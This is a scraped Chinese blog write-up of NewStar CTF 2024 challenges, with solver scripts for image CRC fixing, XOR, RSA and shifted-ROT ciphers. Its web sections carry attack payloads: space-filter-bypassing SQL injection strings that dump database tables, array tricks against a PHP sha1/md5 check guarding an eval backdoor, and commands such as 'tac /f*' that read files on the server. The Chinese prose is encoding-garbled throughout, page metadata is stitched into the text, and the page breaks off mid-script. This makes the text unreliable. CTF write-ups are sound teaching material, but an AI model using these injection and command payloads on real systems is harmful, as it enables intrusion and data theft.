''.join(chr(num) for num in decrypted_values)\rprint(flag) Web ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å— ç®€å•åˆ†æä¸€ä¸‹å‰ç«¯åå†™ä¸ªpyå‘åŒ…å°±è¡Œäº†\nimport requests from bs4 import BeautifulSoup session = requests.Session() url = 'http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/start' res = session.get(url) soup = BeautifulSoup(res.text, 'html.parser') text = soup.find('p', id='text').get_text() user_input = text post_url = 'http://eci-2zeefa47o1td1sssj8ml.cloudeci1.ichunqiu.com/submit' data = {'user_input': user_input} # å‘é€ POST è¯·æ±‚ response = session.post(post_url, data=data) print(response.text) é—å¤±çš„æ‹‰é“¾ æ ¹æ®é¢˜ç›®çš„æç¤ºåº”è¯¥æ˜¯www.zipä¸‹è½½çœ‹ä¸€ä¸‹pizwww.php\n\u003c?php error_reporting(0); //for fun if(isset($_GET['new'])\u0026\u0026isset($_POST['star'])){ if(sha1($_GET['new'])===md5($_POST['star'])\u0026\u0026$_GET['new']!==$_POST['star']){ //æ¬¸ ä¸ºå•¥sha1å’Œmd5ç›¸ç­‰å‘¢ $cmd = $_POST['cmd']; if (preg_match(\"/cat|flag/i\", $cmd)) { die(\"u can not do this \"); } echo eval($cmd); }else{ echo \"Wrong\"; } } ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œäº†\nç„¶åæ‰§è¡Œsystem(â€™tac /f*â€™)å°±å¯ä»¥äº†\nè°¢è°¢çš®è›‹ plus è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ˜¯å­—ç¬¦ç»•è¿‡\n-1\"/**/union/**/select/**/1,database()# -1\"/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()# -1\"/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='Fl4g'# -1\"/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/Fl4g# å¤è¯»æœº ç®€å•æµ‹è¯•äº†ä¸€ä¸‹xsså’Œsstiï¼Œå‘ç°æ˜¯sstiï¼Œä½†æ˜¯æ‰‹æµ‹ä¸å‡ºæ¥ç¦äº†ä»€ä¹ˆï¼Œfenjingä¸€æŠŠæ¢­å§\nPangBai è¿‡å®¶å®¶ï¼ˆ2ï¼‰ gitæ³„éœ²æ‰¾äº†å¥½å‡ ä¸ªç‰ˆæœ¬ï¼Œç”¨https://github.com/WangYihang/GitHackerè¿™ä¸ªç‰ˆæœ¬çš„å¯ä»¥å¾—åˆ°\nä¹Ÿgitä¸‹æ¥ï¼Œgit addä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶BacKd0or.v2d23AOPpDfEW5Ca.php,çœ‹ä¸€ä¸‹å†…å®¹\n\u003c?php # Functions to handle HTML output function print_msg($msg) { $content = file_get_contents('index.html'); $content = preg_replace('/\\s*","wordCount":"12495","inLanguage":"zh-cn","datePublished":"2024-11-04T00:00:00Z","dateModified":"2024-11-04T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/ctf/newstar2024/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=é¦–é¡µ><span>é¦–é¡µ</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=å½’æ¡£><span>å½’æ¡£</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=æ ‡ç­¾><span>æ ‡ç­¾</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=æœç´¢><span>æœç´¢</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=å…³äº><span>å…³äº</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=å‹é“¾><span>å‹é“¾</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-11-04 00:00:00 +0000 UTC'>November 4, 2024</span>&nbsp;Â·&nbsp;<span>25 min</span><h1 class=post-title>Newstar2024</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><p>å‰è¨€:åé¢ä¹Ÿæ²¡æ€ä¹ˆæ‰“äº†ï¼Œåˆæ²¡æ—¶é—´è‡ªå·±åˆç¬¨ï¼ŒæŠ„ä¸ªå†·é¥­æ”¾ä¸Šæ¥å§ã€‚</p><h1 id=week1>week1</h1><h2 id=signin>Signin</h2><h3 id=ez_answer>ez_answer</h3><p>æ­£å¸¸ç­”é¢˜è€å®ä¸€ç‚¹å°±å‡ºflagäº†ï¼Œæ­£å¸¸çš„è§„åˆ™</p><h2 id=misc>Misc</h2><h3 id=decompress>decompress</h3><p>å‰å‡ å±‚æ­£å¸¸çš„è§£å‹ï¼Œåˆ°æœ€åä¸€å±‚æœ‰hintæç¤ºï¼Œæ˜¯æ­£åˆ™æç¤ºç®€å•çš„çœ‹ä¸€ä¸‹ï¼Œä¸€å…±æ˜¯äº”ä½å¯†ç ï¼Œå‰ä¸‰ä½æ˜¯å°å†™å­—æ¯ï¼Œç¬¬å››ä½æ•°å­—ï¼Œç¬¬äº”ä½æ˜¯å°å†™å­—æ¯ï¼Œç”¨å¸¸è§çš„çˆ†ç ´å·¥å…·è¿›è¡Œçˆ†ç ´ä¸€ä¸‹å°±è¡Œï¼Œéœ€è¦ååˆ†é’Ÿå·¦å³çš„æ—¶é—´å§çˆ†ç ´å‡ºæ¥çš„å¯†ç æ˜¯xtr4mï¼Œè¿›å»æ‰“å¼€ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å°±æœ‰flag</p><p><img alt=1 loading=lazy src=/posts/ctf/newstar2024/1.png></p><h3 id=pleasingmusic>pleasingMusic</h3><p><img alt=2 loading=lazy src=/posts/ctf/newstar2024/2.png></p><p>audçœ‹ä¸€ä¸‹æœ‰æ‘©æ–¯ç”µç ï¼Œç”¨åœ¨çº¿ç½‘ç«™å…ˆè¿›è¡Œåˆæ­¥çš„éŸ³é¢‘åˆ†ç¦»ï¼Œç„¶ååˆ©ç”¨é¢˜ç›®æ­£åéƒ½å¥½å¬ï¼Œå°†.-ä»åå¾€å‰æ•²è‡ªå·±åœ¨çº¿ç½‘ç«™æ‰‹æ•²ä¸€ä¸‹å¾—åˆ°ç¼–ç ez_morse_codeï¼Œæœ€åå¥—ä¸ªflag</p><h3 id=whereisflag>WhereIsFlag</h3><p>flagåœ¨proc/self/envrioné‡Œé¢,å…¸å‹çš„è—åœ¨ç¯å¢ƒå˜é‡é‡Œ</p><h3 id=labyrinth>Labyrinth</h3><p>ç®€å•çš„lsbæŸ¥æ‰¾</p><p><img alt=1 loading=lazy src=/posts/ctf/newstar2024/3.png></p><h3 id=å…‘æ¢ç >å…‘æ¢ç </h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> zlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> struct
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Usage: python script.py &lt;png_path&gt;&#34;</span>)
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>file <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>fr <span style=color:#f92672>=</span> open(file, <span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> bytearray(fr[<span style=color:#ae81ff>12</span>:<span style=color:#ae81ff>29</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è·å– CRC32 æ ¡éªŒå’Œ</span>
</span></span><span style=display:flex><span>crc32key <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>unpack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, fr[<span style=color:#ae81ff>29</span>:<span style=color:#ae81ff>33</span>])[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;CRC32 Key: </span><span style=color:#e6db74>{</span>crc32key<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>4096</span>
</span></span><span style=display:flex><span>found <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> w <span style=color:#f92672>in</span> range(n):
</span></span><span style=display:flex><span>    width <span style=color:#f92672>=</span> bytearray(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;i&#39;</span>, w))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> h <span style=color:#f92672>in</span> range(n):
</span></span><span style=display:flex><span>        height <span style=color:#f92672>=</span> bytearray(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;i&#39;</span>, h))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>            data[x<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>] <span style=color:#f92672>=</span> width[x]
</span></span><span style=display:flex><span>            data[x<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>] <span style=color:#f92672>=</span> height[x]
</span></span><span style=display:flex><span>        crc32result <span style=color:#f92672>=</span> zlib<span style=color:#f92672>.</span>crc32(data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> crc32result <span style=color:#f92672>==</span> crc32key:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Width: </span><span style=color:#e6db74>{</span>w<span style=color:#e6db74>}</span><span style=color:#e6db74>, Height: </span><span style=color:#e6db74>{</span>h<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Data: </span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            newpic <span style=color:#f92672>=</span> bytearray(fr)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>                newpic[x<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> width[x]
</span></span><span style=display:flex><span>                newpic[x<span style=color:#f92672>+</span><span style=color:#ae81ff>20</span>] <span style=color:#f92672>=</span> height[x]
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>with</span> open(file, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> fw:
</span></span><span style=display:flex><span>                fw<span style=color:#f92672>.</span>write(newpic)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;æ–°å›¾ç‰‡å·²ä¿å­˜ä¸º: </span><span style=color:#e6db74>{</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            found <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> found:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>ç®€å•çš„crcçˆ†ç ´ï¼Œç›´æ¥è„šæœ¬æ¢­å°±è¡Œäº†ï¼Œflagåœ¨åº•éƒ¨</p><h2 id=crypto>Crypto</h2><h3 id=xor>xor</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å¯†é’¥å’ŒåŠ å¯†çš„å€¼</span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;New_Star_CTF&#39;</span>
</span></span><span style=display:flex><span>c1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>8091799978721254458294926060841</span>
</span></span><span style=display:flex><span>c2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;;:</span><span style=color:#ae81ff>\x1c</span><span style=color:#e6db74>1&lt;</span><span style=color:#ae81ff>\x03</span><span style=color:#e6db74>&gt;*</span><span style=color:#ae81ff>\x10\x11</span><span style=color:#e6db74>u;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è§£å¯† m1</span>
</span></span><span style=display:flex><span>m1 <span style=color:#f92672>=</span> c1 <span style=color:#f92672>^</span> bytes_to_long(key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è§£å¯† m2</span>
</span></span><span style=display:flex><span>m2 <span style=color:#f92672>=</span> bytes(a <span style=color:#f92672>^</span> b <span style=color:#66d9ef>for</span> a, b <span style=color:#f92672>in</span> zip(c2, key))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å°†è§£å¯†çš„ç»“æœè½¬æ¢ä¸ºå­—èŠ‚å¹¶æ‰“å°</span>
</span></span><span style=display:flex><span>flag_part1 <span style=color:#f92672>=</span> long_to_bytes(m1)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>flag_part2 <span style=color:#f92672>=</span> m2<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è¾“å‡ºå®Œæ•´çš„ flag</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> flag_part1 <span style=color:#f92672>+</span> flag_part2
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Decrypted flag:&#39;</span>, flag)
</span></span></code></pre></div><h3 id=base>Base</h3><p>èµ›åšå¨å­ä¸€æŠŠæ¢­</p><p><img alt=4 loading=lazy src=/posts/ctf/newstar2024/4.png></p><h3 id=ä¸€çœ¼ç§’äº†>ä¸€çœ¼ç§’äº†</h3><p>ç®€å•çš„rsaï¼Œé¢˜ç›®è¯´nå°å°çš„ä¹Ÿå¾ˆå¯çˆ±ï¼Œç”¨factordbåœ¨çº¿ç½‘ç«™çœ‹çœ‹å‘ç°æœ‰å› å­ï¼Œå¸¦å…¥pç›´æ¥ä¸Šexp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> gmpy2 <span style=color:#f92672>import</span> invert
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å·²çŸ¥çš„å€¼</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è®¡ç®— q</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è®¡ç®— Ï†(n)</span>
</span></span><span style=display:flex><span>phi_n <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è®¡ç®— d</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> invert(e, phi_n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è§£å¯†</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è¾“å‡ºè§£å¯†åçš„ flag</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Decrypted flag:&#39;</span>, flag<span style=color:#f92672>.</span>decode())
</span></span></code></pre></div><h3 id=strange-king>Strange King</h3><p>rotçš„å˜å½¢ç§»ä½</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt_flag</span>(encrypted_flag):
</span></span><span style=display:flex><span>    decrypted_flag <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    shift_values <span style=color:#f92672>=</span> [<span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>11</span>,<span style=color:#ae81ff>13</span>,<span style=color:#ae81ff>15</span>,<span style=color:#ae81ff>17</span>,<span style=color:#ae81ff>19</span>,<span style=color:#ae81ff>21</span>,<span style=color:#ae81ff>23</span>,<span style=color:#ae81ff>25</span>,<span style=color:#ae81ff>27</span>,<span style=color:#ae81ff>29</span>,<span style=color:#ae81ff>31</span>,<span style=color:#ae81ff>33</span>,<span style=color:#ae81ff>35</span>,<span style=color:#ae81ff>37</span>,<span style=color:#ae81ff>39</span>,<span style=color:#ae81ff>41</span>,<span style=color:#ae81ff>43</span>,<span style=color:#ae81ff>45</span>,<span style=color:#ae81ff>47</span>,<span style=color:#ae81ff>49</span>,<span style=color:#ae81ff>51</span>,<span style=color:#ae81ff>53</span>,<span style=color:#ae81ff>55</span>,<span style=color:#ae81ff>57</span>,<span style=color:#ae81ff>59</span>,<span style=color:#ae81ff>61</span>]  <span style=color:#75715e># ç§»ä½å€¼</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, char <span style=color:#f92672>in</span> enumerate(encrypted_flag):
</span></span><span style=display:flex><span>        <span style=color:#75715e># è®¡ç®—ç§»ä½</span>
</span></span><span style=display:flex><span>        shift <span style=color:#f92672>=</span> shift_values[i <span style=color:#f92672>%</span> len(shift_values)]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> char<span style=color:#f92672>.</span>isalpha():  <span style=color:#75715e># åªå¤„ç†å­—æ¯</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># å¤„ç†å¤§å†™å­—æ¯</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> char<span style=color:#f92672>.</span>isupper():
</span></span><span style=display:flex><span>                new_char <span style=color:#f92672>=</span> chr((ord(char) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>-</span> shift) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span> <span style=color:#f92672>+</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>))
</span></span><span style=display:flex><span>            <span style=color:#75715e># å¤„ç†å°å†™å­—æ¯</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elif</span> char<span style=color:#f92672>.</span>islower():
</span></span><span style=display:flex><span>                new_char <span style=color:#f92672>=</span> chr((ord(char) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>) <span style=color:#f92672>-</span> shift) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span> <span style=color:#f92672>+</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>))
</span></span><span style=display:flex><span>            decrypted_flag<span style=color:#f92672>.</span>append(new_char)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            decrypted_flag<span style=color:#f92672>.</span>append(char)  <span style=color:#75715e># éå­—æ¯å­—ç¬¦ä¸å˜</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(decrypted_flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># æµ‹è¯•</span>
</span></span><span style=display:flex><span>encrypted_flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ksjr</span><span style=color:#e6db74>{EcxvpdErSvcDgdgEzxqjql}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>decrypted_flag <span style=color:#f92672>=</span> decrypt_flag(encrypted_flag)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Decrypted flag:&#39;</span>, decrypted_flag)
</span></span></code></pre></div><h2 id=web>Web</h2><h3 id=headach3>headach3</h3><p><img alt=5 loading=lazy src=/posts/ctf/newstar2024/5.png></p><h3 id=ä¼šèµ¢å—>ä¼šèµ¢å—</h3><p>ç¬¬ä¸€éƒ¨åˆ†çœ‹æºç flag{WA0w</p><p>ç¬¬äºŒéƒ¨åˆ†!_y4_r3al</p><p><img alt=5 loading=lazy src=/posts/ctf/newstar2024/6.png></p><p>ç¬¬ä¸‰éƒ¨åˆ†1y_Gr4sP</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// ä¿®æ”¹çŠ¶æ€ä¸º &#34;è§£å°&#34;
</span></span></span><span style=display:flex><span>document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;state&#39;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;è§£å°&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// è·å–å®é™…çš„ CSRF ä»¤ç‰Œ
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>csrfTokenValue</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;csrf_token&#39;</span>).<span style=color:#a6e22e>value</span>; <span style=color:#75715e>// ç¡®ä¿è¿™ä¸ªå…ƒç´ å­˜åœ¨
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// å‘é€è¯·æ±‚
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/api/flag/s34l&#39;</span>, {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>headers</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/json&#39;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({ <span style=color:#a6e22e>csrf_token</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>csrfTokenValue</span> })
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>.<span style=color:#a6e22e>then</span>(<span style=color:#a6e22e>response</span> =&gt; <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>json</span>())
</span></span><span style=display:flex><span>.<span style=color:#a6e22e>then</span>(<span style=color:#a6e22e>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ç¬¬ä¸‰éƒ¨åˆ†Flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>flag</span><span style=color:#e6db74>}</span><span style=color:#e6db74>, ä¸‹ä¸€å…³: /</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>nextLevel</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#39;æ— &#39;</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>.<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>error</span> =&gt; <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#39;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:&#39;</span>, <span style=color:#a6e22e>error</span>));
</span></span></code></pre></div><p>ç¬¬å››éƒ¨åˆ†fSkpKcyF9</p><pre tabindex=0><code>// è·å– CSRF ä»¤ç‰Œ
const csrfToken = document.getElementById(&#39;csrf_token&#39;).value;

// å‘é€è¯·æ±‚
fetch(&#39;/api/flag/Ap3x&#39;, {
    method: &#39;POST&#39;,
    headers: {
        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
    },
    body: `csrf_token=${encodeURIComponent(csrfToken)}`
})
.then(response =&gt; response.json())
.then(data =&gt; {
    console.log(`Flag: ${data.flag}`);
})
.catch(error =&gt; console.error(&#39;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:&#39;, error));
</code></pre><p>flag{WA0w!_y4_r3al1y_Gr4sP}ï¼Ÿä¸å¯¹ï¼Œåº”è¯¥ç›´æ¥ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9ç„¶åå†è½¬base64çš„</p><h3 id=æ™ºæ¢°å±æœº>æ™ºæ¢°å±æœº</h3><p>æ‰¾åˆ°å¯¹åº”çš„ç„¶åè·‘è„šæœ¬å¡«å…¥å¾—åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$decrypted_cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cat /f*&#39;</span>;
</span></span><span style=display:flex><span>$cmd<span style=color:#f92672>=</span><span style=color:#a6e22e>base64_encode</span>($decrypted_cmd);
</span></span><span style=display:flex><span>$reversed_cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($cmd) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>; $i <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span>; $i<span style=color:#f92672>--</span>) {
